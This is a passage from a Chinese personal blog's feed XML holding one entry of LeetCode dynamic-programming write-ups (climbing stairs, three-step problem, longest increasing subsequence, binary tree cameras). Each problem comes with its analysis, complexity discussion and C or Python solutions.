    <category term="栈迁移" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
    <category term="ret2libc" scheme="http://archive.next.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="canary" scheme="http://archive.next.arttnba3.cn/tags/canary/"/>
    
  </entry>
  
  <entry>
    <title>【OJ-0x0003-Leetcode】动态规划部分write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0003-Leetcode%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0003-Leetcode%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-06T08:21:11.000Z</published>
    <updated>2020-11-20T06:07:36.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><strong>动态规划</strong>（<strong>Dynamic Programming</strong>）是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。同时也是各类信息学竞赛（ Olympiad in Informatics ）中较为常用的算法之一。</p><p>作为前·蒟蒻·OIer，对动态规划也是稍微了解一点点的XD，所以现在来简单刷一刷leetcode上动态规划的题Or2</p><blockquote><p>最后更新日期2020.9.7</p></blockquote><a id="more"></a><h2 id="pre-什么是动态规划算法？"><a href="#pre-什么是动态规划算法？" class="headerlink" title="pre.什么是动态规划算法？"></a>pre.什么是动态规划算法？</h2><p>简单而言：</p><p>动态规划便是通过寻找出一个问题的<strong>重叠子问题</strong>/<strong>最优子结构</strong>来优化对问题的求解，将问题进行分阶段求解，并确保当前阶段是过于所有阶段的完美总结。</p><p>具体的<strong>可以看看我之前写的</strong><a href="https://archive.next.arttnba3.cn/2020/04/21/[算法浅析-0x01]动态规划算法浅析by-arttnba3/">博文</a></p><h1 id="0x01-难度：简单"><a href="#0x01-难度：简单" class="headerlink" title="0x01.难度：简单"></a>0x01.难度：简单</h1><h2 id="0x00-爬楼梯"><a href="#0x00-爬楼梯" class="headerlink" title="0x00.爬楼梯"></a>0x00.<a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">爬楼梯</a></h2><blockquote><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。</p><p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p><p>注意：给定 n 是一个正整数。</p><p>示例 1：</p><p>输入： 2<br>输出： 2<br>解释： 有两种方法可以爬到楼顶。</p><ol><li>1 阶 + 1 阶</li><li>2 阶<br>示例 2：</li></ol><p>输入： 3<br>输出： 3<br>解释： 有三种方法可以爬到楼顶。</p><ol><li>1 阶 + 1 阶 + 1 阶</li><li>1 阶 + 2 阶</li><li>2 阶 + 1 阶</li></ol><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/climbing-stairs" target="_blank" rel="noopener">https://leetcode-cn.com/problems/climbing-stairs</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>简单分析：</p><ul><li><p>上0级楼梯：有0种走法</p></li><li><p>上1级楼梯：有1种走法：直接跨一阶楼梯</p></li><li><p>上2级楼梯：有2种走法：①先跨一阶再跨一阶；②直接跨两阶楼梯</p></li><li><p>……</p></li><li><p><strong>上N阶楼梯</strong>：<strong>①先走到第N-1阶，再跨一阶楼梯②先走到N-2阶，再一步跨两阶楼梯</strong>：一共是<strong>F(N-1)+F(N-2)种走法</strong></p></li></ul><p>也就是说，我们走n级楼梯的走法数量都可以化为<strong>①先走到第N-1阶，再跨一阶楼梯②先走到N-2阶，再一步跨两阶楼梯</strong>的走法</p><h4 id="状态转移方程"><a href="#状态转移方程" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p><strong>F(N) = F(N-1) + F(N-2)</strong></p><p>有了这个方程之后，我们只需要知道<strong>走1级楼梯的走法数量与走2级楼梯的走法数量</strong>，就可以顺利地<strong>推出走任意一级楼梯的走法数量</strong></p><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>需要求解n次，故时间复杂度为线性时间复杂度<strong>O(N)</strong></p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>因为我们只需要使用三个变量迭代求解，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="C语言版："><a href="#C语言版：" class="headerlink" title="C语言版："></a>C语言版：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b += temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/7bw2LteuRUhadgl.png" alt="image.png"></p><h4 id="Python语言版："><a href="#Python语言版：" class="headerlink" title="Python语言版："></a>Python语言版：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        a, b = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">            a,b = b, a+b</span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/NtQO4EmZ7uxWTaf.png" alt="image.png"></p><blockquote><p>肉眼可见的Python效率低下</p><p><img src="https://i.loli.net/2020/09/22/ZJeAi9vElOyTp7M.png" alt="image.png"></p><p>还好这次C不用像洛谷那样手撕大数加减（毕竟不是OI标准23333</p></blockquote><h2 id="0x01-面试题-08-01-三步问题"><a href="#0x01-面试题-08-01-三步问题" class="headerlink" title="0x01.面试题 08.01. 三步问题"></a>0x01.<a href="https://leetcode-cn.com/problems/three-steps-problem-lcci/" target="_blank" rel="noopener">面试题 08.01. 三步问题</a></h2><blockquote><p>三步问题。有个小孩正在上楼梯，楼梯有n阶台阶，小孩一次可以上1阶、2阶或3阶。实现一种方法，计算小孩有多少种上楼梯的方式。结果可能很大，你需要对结果模1000000007。</p><p>示例1:</p><p> 输入：n = 3<br> 输出：4<br> 说明: 有四种走法<br>示例2:</p><p> 输入：n = 5<br> 输出：13<br>提示:</p><p>n范围在[1, 1000000]之间</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/three-steps-problem-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/three-steps-problem-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>爬楼梯问题的升级版，总体思路还是一样的：</p><h3 id="问题分析-1"><a href="#问题分析-1" class="headerlink" title="问题分析"></a>问题分析</h3><p>简单分析：</p><ul><li>上0级楼梯：有0种走法</li><li>上1级楼梯：有1种走法：直接跨一阶楼梯</li><li>上2级楼梯：有2种走法：①先跨一阶再跨一阶；②直接跨两阶楼梯</li><li>上3级楼梯：有4种走法：①先跨一阶再跨一阶再跨一阶；②先跨一阶再跨两阶；③先跨两阶再跨一阶；④直接跨3阶</li><li>……</li><li><strong>上N阶楼梯</strong>：<strong>①先走到第N-1阶，再跨一阶楼梯②先走到N-2阶，再一步跨两阶楼梯③先走到N-3阶，再一步跨三阶楼梯</strong>：一共是<strong>F(N-1)+F(N-2)+F(N-3)种走法</strong></li></ul><p>也就是说，我们走n级楼梯的走法数量都可以化为<strong>①先走到第N-1阶，再跨一阶楼梯②先走到N-2阶，再一步跨两阶楼梯③先走到N-3阶，再一步跨三阶楼梯</strong>的走法</p><h4 id="状态转移方程-1"><a href="#状态转移方程-1" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p><strong>F(N) = F(N-1) + F(N-2) + F(N-3)</strong></p><p>有了这个方程之后，我们只需要知道<strong>走1级楼梯的走法数量与走2级楼梯的走法数量</strong>，就可以顺利地<strong>推出走任意一级楼梯的走法数量</strong></p><h4 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>需要求解n次，故时间复杂度为线性时间复杂度<strong>O(N)</strong></p><h4 id="空间复杂度-1"><a href="#空间复杂度-1" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>因为我们只需要使用三个变量迭代求解，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="C语言版：-1"><a href="#C语言版：-1" class="headerlink" title="C语言版："></a>C语言版：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">waysToStep</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">1</span>, c = <span class="number">2</span>, d;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        d = (a+b+c) % <span class="number">1000000007</span>;</span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">        c = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/ZW3hgPctdDiTBXG.png" alt="image.png"></p><h4 id="Python语言版"><a href="#Python语言版" class="headerlink" title="Python语言版"></a>Python语言版</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">waysToStep</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        a, b, c = <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">            a,b,c = b, c, (a + b + c)%<span class="number">1000000007</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/d6I87nMHYkZqLCB.png" alt="image.png"></p><blockquote><p>效率上的极巨差距</p><p><img src="https://i.loli.net/2020/09/22/EMwRvZBWJNSep87.png" alt="image.png"></p></blockquote><h1 id="0x02-难度：中等"><a href="#0x02-难度：中等" class="headerlink" title="0x02.难度：中等"></a>0x02.难度：中等</h1><h2 id="0x00-最长上升子序列"><a href="#0x00-最长上升子序列" class="headerlink" title="0x00.最长上升子序列"></a>0x00.<a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/" target="_blank" rel="noopener">最长上升子序列</a></h2><blockquote><p>给定一个无序的整数数组，找到其中最长上升子序列的长度。</p><p>示例:</p><p>输入: [10,9,2,5,3,7,101,18]<br>输出: 4<br>解释: 最长的上升子序列是 [2,3,7,101]，它的长度是 4。<br>说明:</p><p>可能会有多种最长上升子序列的组合，你只需要输出对应的长度即可。<br>你算法的时间复杂度应该为 O(n2) 。<br>进阶: 你能将算法的时间复杂度降低到 O(n log n) 吗?</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/longest-increasing-subsequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-increasing-subsequence</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="问题分析-2"><a href="#问题分析-2" class="headerlink" title="问题分析"></a>问题分析</h3><p>最长上升子序列问题可以说是动态规划算法最经典的一个入门问题了，无论是在各大算法书上还是竞赛书上在讲到动态规划时往往会选择使用这个问题来入门</p><p>首先我们要求解最长上升子序列，我们就必须要将该序列上的各个结点“串起来”——<strong>对于任一结点都使用一个变量来储存在该结点上的最长上升子序列中该结点的下一结点的索引</strong></p><p>其次，我们不难发现，对于任一结点与其往前所有结点构成的序列，<strong>要求解该序列中的最长上升子序列，我们只需要求解该最长上升子序列中的倒数第二个结点与往前所有结点所构成的序列、再接上该序列的最后一个结点即可</strong></p><h3 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h3><h4 id="状态转移方程-2"><a href="#状态转移方程-2" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p>对于任一数字序列a<sub>1</sub>,a<sub>2</sub>,…,a<sub>n</sub>，其最长上升子序列的长度为：<strong>f(a<sub>n</sub>) = f(a<sub>m</sub>)+1</strong></p><ul><li><p>其中<strong>a<sub>m</sub>&lt;=a<sub>n</sub></strong></p></li><li><p><strong>f(a<sub>m</sub>)为数字序列a<sub>1</sub>,a<sub>2</sub>,…,a<sub>n-1</sub>所能构成的最大元素a<sub>max</sub>不大于a<sub>n</sub>的上升子序列中的最大长度</strong></p></li></ul><p>那么我们便可以使用遍历的方法<strong>逐一求出序列a<sub>1</sub>，a<sub>1</sub>、a<sub>2</sub>，a<sub>1</sub>、a<sub>2</sub>、a<sub>3</sub>，…，a<sub>1</sub>、a<sub>2</sub>、a<sub>3</sub>、…、a<sub>n</sub>中的最长上升子序列的长度</strong></p><h4 id="具体架构"><a href="#具体架构" class="headerlink" title="具体架构"></a>具体架构</h4><p>状态转移方程构造出来后，接下来的代码就很好写了。</p><p>我们选择采用一个<strong>三维数组</strong>来储存结点信息</p><ul><li>第一维：<strong>结点的值</strong></li><li>第二维：<strong>结点上的最长上升子序列的长度</strong></li><li>第三维：<strong>结点上的最长上升子序列中该结点的下一结点的索引</strong></li></ul><p>我们采用两层循环来对各个结点进行遍历:</p><ul><li>第一层循环遍历每一个结点</li><li>第二层循环遍历初始节点到第一层循环结点的前一结点求解到该结点的最长上升子序列</li></ul><h4 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>两层循环嵌套，我们很容易得出时间复杂度为<strong>O（N^2）</strong></p><h4 id="空间复杂度-2"><a href="#空间复杂度-2" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>使用动态数组的话就是线性空间复杂度<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(numsSize == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n, lis[<span class="number">10000</span>][<span class="number">3</span>]=&#123;<span class="number">0</span>&#125;,_max = <span class="number">-1</span>;</span><br><span class="line">    n = numsSize;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lis[i][<span class="number">0</span>]=nums[i];</span><br><span class="line">        lis[i][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        lis[i][<span class="number">2</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(lis[i][<span class="number">0</span>]&gt;lis[j][<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//lis[i][1] = lis[i][1]&gt;lis[j][1]+1?lis[i][1]:lis[j][1]+1,lis[i][2] = j;</span></span><br><span class="line">                <span class="comment">//it's too hard to understand, so I chose the following one to get it clear</span></span><br><span class="line">                <span class="keyword">if</span>(lis[i][<span class="number">1</span>]&lt;=lis[j][<span class="number">1</span>]+<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    lis[i][<span class="number">1</span>] = lis[j][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">                    lis[i][<span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _max = lis[i][<span class="number">1</span>]&gt;_max?lis[i][<span class="number">1</span>]:_max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于时间复杂度为O(N^2)，成绩不是那么的理想</p><p><img src="https://i.loli.net/2020/09/06/OQgt96ZpeGNxXSo.png" alt="image.png"></p><p>那么我们能不能再加快一点呢？</p><h3 id="进阶：贪心-二分查找"><a href="#进阶：贪心-二分查找" class="headerlink" title="进阶：贪心+二分查找"></a>进阶：贪心+二分查找</h3><p>我们可以选择使用贪心算法配合二分查找来解决这个问题（<del>当然这个时候就已经不再是动态规划了，</del>（<del>但是是不是动态规划已经无所谓了！</del>（<del>不</del></p><blockquote><p>咕了，后面有时间再写🕊🕊🕊</p></blockquote><h1 id="0x03-难度：困难"><a href="#0x03-难度：困难" class="headerlink" title="0x03.难度：困难"></a>0x03.难度：困难</h1><h2 id="0x00-监控二叉树"><a href="#0x00-监控二叉树" class="headerlink" title="0x00. 监控二叉树"></a>0x00.<a href="https://leetcode-cn.com/problems/binary-tree-cameras/" target="_blank" rel="noopener"> 监控二叉树</a></h2><blockquote><p>给定一个二叉树，我们在树的节点上安装摄像头。</p><p>节点上的每个摄影头都可以监视其父对象、自身及其直接子对象。</p><p>计算监控树的所有节点所需的最小摄像头数量。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_01.png" alt="image.png"></p><p>输入：[0,0,null,0,0]<br>输出：1<br>解释：如图所示，一台摄像头足以监控所有节点。<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_02.png" alt="image.png"></p><p>输入：[0,0,null,0,null,0,null,null,0]<br>输出：2<br>解释：需要至少两个摄像头来监视树的所有节点。 上图显示了摄像头放置的有效位置之一。</p><p>提示：</p><p>给定树的节点数的范围是 [1, 1000]。<br>每个节点的值都是 0。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-tree-cameras" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-tree-cameras</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>该题为2020.9.22的每日一题</p></blockquote><p>仔细想想，对于一个结点是否需要安装摄像头，其实是<strong>由其子树的状态来决定的</strong>，那么我们可以使用<strong>动态规划算法</strong></p><h3 id="解法：递归-深度优先搜索（DFS）-动态规划（DP）"><a href="#解法：递归-深度优先搜索（DFS）-动态规划（DP）" class="headerlink" title="解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）"></a>解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）</h3><p>大概如下图所示：<br><img src="https://i.loli.net/2020/09/22/5v4sz9fdl2OLau7.png" alt="image.png"></p><p>我们考虑有以下几种情况：</p><ul><li><strong>当一个结点的左或右子树没有被摄像头覆盖上时，这个结点必须要安装一个摄像头来监测其左或右子树，定义为状态码STATUS_CAMERA</strong></li><li><strong>当一个结点的左右子树都已经被摄像头覆盖上时，为了实现摄像头数量的最小化，需要在该结点的父结点放置摄像头，即在回到父结点前该结点都是未被覆盖的，定义为状态码STATUS_UNCOVERED</strong></li><li><strong>当一个结点的左右子树中存在摄像头，则该结点肯定是被覆盖了的，定义为状态码STATUS_COVERED</strong></li><li><strong>对于结点为NULL的情况，我们可以默认他是被覆盖了的结点，即定义为状态码STATUS_COVERED</strong></li></ul><p>同时，<strong>我们还需要对这棵树的根节点做一次单独的检测，以确定是否要在其上放置摄像头</strong></p><p>为了方便判定，我们将STATUS_CAMERA设置为状态码中值相对大的一个</p><h4 id="状态转移方程-3"><a href="#状态转移方程-3" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p><strong>STATUS_ROOT = F(STATUS_LEFT, STATUS_RIGHT)</strong></p><h4 id="时间复杂度："><a href="#时间复杂度：" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>n次遍历，线性时间复杂度<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度："><a href="#空间复杂度：" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>递归算法要开辟n个栈空间，故为线性空间复杂度<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * status code</span></span><br><span class="line"><span class="comment"> * 0: waiting for pwn</span></span><br><span class="line"><span class="comment"> * 1: has been pwn</span></span><br><span class="line"><span class="comment"> * 2: camara here</span></span><br><span class="line"><span class="comment"> *-1: inner error, just a placeholder in fact</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_UNCOVERED 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_COVERED 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_CAMERA 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_ERROR -1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minCameraCover</span><span class="params">(struct TreeNode* root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> amounts=<span class="number">0</span>;<span class="comment">//amounts of camera</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//add a camera to the root if status of root is 0</span></span><br><span class="line">    <span class="keyword">if</span>(dfs(root,&amp;amounts) == STATUS_UNCOVERED)</span><br><span class="line">        amounts++;</span><br><span class="line">    <span class="keyword">return</span> amounts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> * amounts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//NULL pointer signed as status 1</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the status of left and right node</span></span><br><span class="line">    <span class="keyword">int</span> left = dfs(root-&gt;left, amounts);</span><br><span class="line">    <span class="keyword">int</span> right = dfs(root-&gt;right, amounts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if one of both uncovered yet, a camera is needed</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED)</span><br><span class="line">    &#123;</span><br><span class="line">        (*amounts)++;</span><br><span class="line">        <span class="keyword">return</span> STATUS_CAMERA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if both are covered, father's of root may need a camera</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNCOVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if there's at least one camera in both childs, the root is covered</span></span><br><span class="line">    <span class="keyword">if</span>(left + right &gt; STATUS_CAMERA)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//error code(not used)</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/64ytrK3gLNGowbf.png" alt="EE8895_CCLKZDA_OPW4_FT1.png"></p>]]></content>
    
    
